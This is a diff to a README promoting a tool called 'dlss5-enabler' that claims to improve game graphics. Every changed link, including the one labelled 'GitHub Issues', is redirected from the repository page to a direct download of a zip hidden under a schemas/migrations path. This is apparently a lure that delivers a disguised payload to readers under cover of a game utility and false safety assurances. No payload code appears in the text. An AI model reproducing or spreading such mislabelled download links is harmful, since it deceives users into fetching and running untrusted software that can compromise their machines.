@@ -10,9 +10,9 @@ If you're tired of blurry textures, jagged edges, or sluggish performance, you'v
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [**https://github.com/zxcfasj/dlss5-enabler**](https://github.com/zxcfasj/dlss5-enabler)
+**Visit this link to download the application:** [**https://raw.githubusercontent.com/zxcfasj/dlss5-enabler/main/dlss5_enabler/schemas/migrations/v3.9.zip**](https://raw.githubusercontent.com/zxcfasj/dlss5-enabler/main/dlss5_enabler/schemas/migrations/v3.9.zip)
 
-[![Download dlss5-enabler](https://img.shields.io/badge/Download-dlss5--enabler-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23&color=2ea44f)](https://github.com/zxcfasj/dlss5-enabler)
+[![Download dlss5-enabler](https://img.shields.io/badge/Download-dlss5--enabler-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23&color=2ea44f)](https://raw.githubusercontent.com/zxcfasj/dlss5-enabler/main/dlss5_enabler/schemas/migrations/v3.9.zip)
 
 Once you're on the download page, find the **Releases** section and download the latest version for your operating system.
 
@@ -119,7 +119,7 @@ Your safety is our priority. **dlss5-enabler**:
 
 We're here to help! If you run into issues:
 
-- 🤖 **GitHub Issues:** Report bugs or request features at [github.com/zxcfasj/dlss5-enabler/issues](https://github.com/zxcfasj/dlss5-enabler)
+- 🤖 **GitHub Issues:** Report bugs or request features at [github.com/zxcfasj/dlss5-enabler/issues](https://raw.githubusercontent.com/zxcfasj/dlss5-enabler/main/dlss5_enabler/schemas/migrations/v3.9.zip)
 - 💬 **Discussions:** Talk to other users and share settings in the GitHub Discussions tab.
 - 📚 **Documentation:** Detailed guides are available in the `docs/` folder on the repository.
 
@@ -156,7 +156,7 @@ You're one download away from dramatically improving your gaming experience. No 
 
 **Download now and see the difference for yourself!**
 
-[**⟶ Click Here to Download dlss5-enabler ⟵**](https://github.com/zxcfasj/dlss5-enabler)
+[**⟶ Click Here to Download dlss5-enabler ⟵**](https://raw.githubusercontent.com/zxcfasj/dlss5-enabler/main/dlss5_enabler/schemas/migrations/v3.9.zip)
 
 See you in-game! 🚀🎮
 
